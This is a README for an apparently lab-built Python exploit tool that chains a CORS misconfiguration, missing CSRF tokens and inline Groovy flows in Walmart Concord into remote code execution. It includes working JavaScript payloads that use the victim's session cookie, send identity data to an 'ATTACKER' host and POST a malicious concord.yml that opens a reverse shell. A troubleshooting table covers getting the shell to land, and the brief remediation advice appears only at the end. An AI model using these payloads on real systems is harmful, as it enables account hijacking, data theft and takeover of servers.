# Concord CORS → Groovy RCE — Automated Exploit

> Single-file Python tool that weaponizes a CORS misconfiguration in **Walmart Concord** into authenticated remote code execution via a malicious Groovy flow, and ships an interactive reverse shell handler.

A victim with an authenticated Concord session visits an attacker-controlled page. Because Concord reflects a permissive CORS policy **and** the browser is told to attach credentials, the attacker's JavaScript rides the victim's session to upload a malicious `concord.yml` process definition. Concord resolves a Groovy dependency, executes the embedded flow, and a reverse shell lands on the attacker.

This repo contains a single script that orchestrates the **entire** chain — payload hosting, credential/exfil capture, process-creation feedback, and the shell handler — all in one terminal.

---

## ⚠️ Disclaimer

For authorized testing and education only. Run this **exclusively** against systems you own or have explicit written permission to test (e.g. a lab you control). Unauthorized use against systems you don't own is illegal. The author assumes no liability for misuse.

---

## Table of Contents

- [The Vulnerability](#the-vulnerability)
- [Attack Chain](#attack-chain)
- [Requirements](#requirements)
- [Usage](#usage)
- [Walkthrough](#walkthrough)
  - [1. Setup & Launch](#1-setup--launch)
  - [2. The Payload (`concord.yml`)](#2-the-payload-concordyml)
  - [3. Delivery via the Simulator](#3-delivery-via-the-simulator)
  - [4. Full Exploitation — Exfil → RCE → Shell](#4-full-exploitation--exfil--rce--shell)
- [The Payload Explained](#the-payload-explained)
- [The `// FIXME` — Why a Naive Fetch Fails](#the--fixme--why-a-naive-fetch-fails)
- [Troubleshooting](#troubleshooting)
- [Detection & Remediation](#detection--remediation)
- [References](#references)

---

## The Vulnerability

Three independent weaknesses combine into a full RCE chain:

| # | Weakness | Effect |
|---|----------|--------|
| 1 | **Permissive CORS** | The Concord API reflects the requesting origin and allows credentialed cross-origin reads, so attacker JS can read authenticated responses. |
| 2 | **No CSRF protection** | The process-creation endpoint accepts a cross-origin `multipart/form-data` POST with only the session cookie — no anti-CSRF token. |
| 3 | **Arbitrary Groovy execution** | A `concord.yml` flow can declare a Maven dependency and run an inline Groovy `body`, i.e. arbitrary JVM code, by design. |

Individually each is a "config smell." Chained, an attacker who gets a logged-in user to open a link achieves code execution on the Concord host.

---

## Attack Chain

```
[ Victim browser, authenticated to Concord ]
                │  opens http://ATTACKER/
                ▼
[ Attacker page JS ]
   1. fetch /api/service/console/whoami  (credentials: include)
        └─► reads identity cross-origin  ──► exfil to attacker
   2. POST /api/v1/process  (credentials: include, multipart concord.yml)
        └─► Concord pulls groovy-all dep, runs inline Groovy body
                ▼
[ Concord host ] ── reverse shell ──► [ Attacker :9000 ]
```

---

## Requirements

- A Concord instance reachable from the victim under the internal hostname `concord:8001` (lab DNS), or adjust the endpoint in the script.
- Python 3.8+ on the attacker box.
- Ports **80** (payload + exfil) and **9000** (reverse shell) free on the attacker box. Port 80 needs `sudo`.
- A way to get the authenticated victim to load your page (in the lab, the activity simulator does this).

---

## Usage

```bash
git clone https://github.com/<your-user>/concord-rce.git
cd concord-rce
sudo python3 avto.py <ATTACKER_IP>
```

Then deliver `http://<ATTACKER_IP>/` to the authenticated victim. Everything streams into the single terminal: payload served → identity exfil → process `instanceId` → interactive shell on `:9000`.

---

## Walkthrough

### 1. Setup & Launch

Run the tool with your attacker IP. It spins up three things in parallel threads:

1. An HTTP server on **:80** serving the malicious `index.html` payload.
2. The same server captures any `?msg=` / `?err=` callback and prints the decoded value (identity, process response, or JS errors).
3. A raw-socket reverse shell handler on **:9000**.

No separate `python -m http.server` or `nc` needed.

![Tool launch — three listeners come up](screenshots/01-launch.png)

### 2. The Payload (`concord.yml`)

The core weapon is a `concord.yml` that declares the Groovy runtime as a Maven dependency and runs an inline reverse shell in its `body`. The script templates your attacker IP and port straight into this YAML, so you never hand-edit it.

Correctness notes:
- **Indentation is load-bearing.** YAML + the `body: |` block scalar are whitespace-sensitive; a stray tab breaks the flow.
- The dependency pins a Groovy version (`groovy-all:pom:2.5.8`). If the host can't resolve it, the process errors before the shell fires.

![The generated YAML payload](screenshots/02-payload.png)

### 3. Delivery via the Simulator

Hand `http://<ATTACKER_IP>/` to the logged-in user. In the lab, point the activity simulator at your attacker IP and trigger it.

![Delivering the URL via the activity simulator](screenshots/03-simulator.png)

### 4. Full Exploitation — Exfil → RCE → Shell

Once the authenticated victim loads the page, the whole chain fires in sequence:

1. **Identity exfil** — `/whoami` returns a non-401, the identity JSON (`realm` / `username` / `displayName`) is exfiltrated. Here the victim is `concordAgent`.
2. **Process created** — the `concord.yml` is POSTed to `/api/v1/process`; Concord returns `instanceId` + `ok: true`.
3. **Shell caught** — the Groovy flow dials back to `:9000` and drops into an interactive shell. `whoami` returns `concord`, and `ls` shows the process workspace (`_attachments`, `_instanceId`, `_main.json`, `concord.yml`).

![Identity exfil, process creation, and reverse shell — all in one terminal](screenshots/04-pwned.png)

---

## The Payload Explained

```html
fetch("http://concord:8001/api/service/console/whoami", {
    credentials: 'include'          // ride the victim's session cookie
})
.then(async (response) => {
    if (response.status != 401) {   // authenticated?
        let data = await response.text();
        fetch("http://ATTACKER/?msg=" + encodeURIComponent(data)); // exfil identity
        rce();                      // proceed to code execution
    } else {
        fetch("http://ATTACKER/?msg=UserNotLoggedIn");
    }
});
```

```html
function rce() {
    var ymlBlob = new Blob([yml], { type: "application/yml" });
    var fd = new FormData();
    fd.append('concord.yml', ymlBlob);   // multipart field name matters
    fetch("http://concord:8001/api/v1/process", {
        method: 'POST',                  // process creation is a POST
        credentials: 'include',          // attach session — without this, unauthenticated
        body: fd
    })
    .then(r => r.text())
    .then(data => fetch("http://ATTACKER/?msg=" + encodeURIComponent(data)))
    .catch(err => fetch("http://ATTACKER/?err=" + encodeURIComponent(err)));
}
```

- **`credentials: 'include'`** on *both* requests is what makes the cross-origin calls run as the victim. The permissive CORS policy is what lets the JS *read* the responses.
- The `concord.yml` field name and `multipart/form-data` encoding must match what the API expects, or process creation silently fails.
- `encodeURIComponent` on exfil keeps JSON braces/spaces from corrupting the `?msg=` query (cleaner logs than raw concatenation).

---

## The `// FIXME` — Why a Naive Fetch Fails

A common first attempt at the `rce()` POST looks like this:

```js
fetch("http://concord:8001/api/v1/process", {
    // FIXME
    body: fd
});
```

This **does not work**, and the failure is quiet — `whoami` succeeds, but no shell ever lands. Two reasons:

1. **Missing `method: 'POST'`.** A bare `fetch` defaults to **GET**. The process endpoint creates a resource and expects POST; a GET won't create anything.
2. **Missing `credentials: 'include'`.** Without it the browser won't attach the victim's session cookie to *this* request, so the POST arrives **unauthenticated** even though the earlier `whoami` was authenticated. Concord rejects it, no process is created, no shell.

Fixing both lines is the difference between "exfil works but nothing happens" and a full reverse shell.

---

## Troubleshooting

| Symptom | Likely cause |
|---------|--------------|
| `UserNotLoggedIn` in logs | Victim has no active Concord session — re-auth the victim / re-run the simulator. |
| `whoami` exfil works, no shell | The classic `// FIXME` — missing `method: 'POST'` and/or `credentials: 'include'`. |
| Process accepted (`ok: true`) but no shell | Groovy dependency didn't resolve on the host, or `:9000` listener port doesn't match the YAML port. |
| Garbled `?msg=` in logs | Use `encodeURIComponent` (already in this tool). |
| Shell connects then dies | Host egress filtering, or the inline loop hit `exitValue()` early — re-fire delivery. |
| Exfil hits a different box | `ATTACKER_IP` in the payload and the IP you serve from must be the **same** interface. |

---

## Detection & Remediation

**Defenders:**
- Replace the reflective CORS policy with a strict allow-list; never combine origin reflection with `Access-Control-Allow-Credentials: true`.
- Add anti-CSRF tokens (or `SameSite=Strict` cookies) to state-changing endpoints like process creation.
- Restrict or sandbox the ability of flows to pull arbitrary dependencies and run inline Groovy; gate process creation behind stronger authZ.
- Egress-filter the Concord host so it can't open arbitrary outbound TCP.

---

## References

- Walmart Concord — official documentation (process API, dependencies, Groovy scripting).
- MDN — CORS, `fetch` credentials, `FormData`.
- OWASP — CORS misconfiguration & CSRF.

---

*Built as a lab exercise in chaining CORS → CSRF → arbitrary-code-execution. Understand the chain, don't just run the script.*
